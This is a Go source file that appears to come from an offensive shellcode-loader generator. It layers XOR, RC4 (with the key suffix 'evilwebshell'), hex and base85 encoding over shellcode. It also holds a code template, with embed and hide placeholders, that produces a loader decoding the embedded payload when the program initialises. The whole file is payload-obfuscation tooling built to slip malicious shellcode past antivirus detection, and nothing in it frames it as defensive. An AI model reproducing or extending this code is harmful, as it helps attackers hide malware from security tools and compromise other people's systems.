package encode

import (
	"encoding/hex"
	"github.com/darkwyrm/b85"
)

var Decode2string = []string{
	`//go:embed {{.shellcode}}
var {{.shellcode}} []byte
//go:embed {{.name}}
var {{.name}} []byte

func init() {
	//__HIDE__
	//__SEPARATE__
	{{.shellcode}}, _ = b85.Decode(string({{.shellcode}}))
	{{.shellcode}}, _ = hex.DecodeString(string({{.shellcode}}))
	{{.shellcode}} = {{.rc4}}({{.shellcode}}, []byte(string({{.name}})+"evilwebshell"))
	{{.shellcode}} = {{.xor}}({{.shellcode}}, {{.name}})
}
func {{.xor}}({{.canshu}} []byte, Key []byte) []byte {
	var result []byte
	for i := 0; i < len({{.canshu}}); i++ {
		result = append(result, {{.canshu}}[i]^Key[i%len(Key)])
	}
	return result
}
func {{.rc4}}({{.canshu}} []byte, key []byte) []byte {
	cipher, err := rc4.NewCipher(key)
	if err != nil {
		log.Println(err)
	}
	decryptedBytes := make([]byte, len({{.canshu}}))
	cipher.XORKeyStream(decryptedBytes, {{.canshu}})
	return decryptedBytes
}`,
	`
	"encoding/hex"
	"crypto/rc4"
	"github.com/darkwyrm/b85"
	"log"
	//__IMPORT__`,
}

//xor+rc4+hex+base85
func Encode2(shellcode []byte, key []byte) []byte {
	var encodedbyte []byte
	encodedbyte = Xor(shellcode, key)
	encodedbyte = rc4encode(encodedbyte, []byte(string(key)+"evilwebshell"))
	encodedbyte = []byte(hex.EncodeToString(encodedbyte))
	encodedbyte = []byte(b85.Encode(encodedbyte))
	return encodedbyte
}

func Decode2(encodedbyte []byte, key []byte) []byte {
	var shellcode []byte
	shellcode, _ = b85.Decode(string(encodedbyte))
	shellcode, _ = hex.DecodeString(string(shellcode))
	shellcode = rc4decode(shellcode, []byte(string(key)+"evilwebshell"))
	shellcode = Xor(shellcode, key)
	return shellcode
}
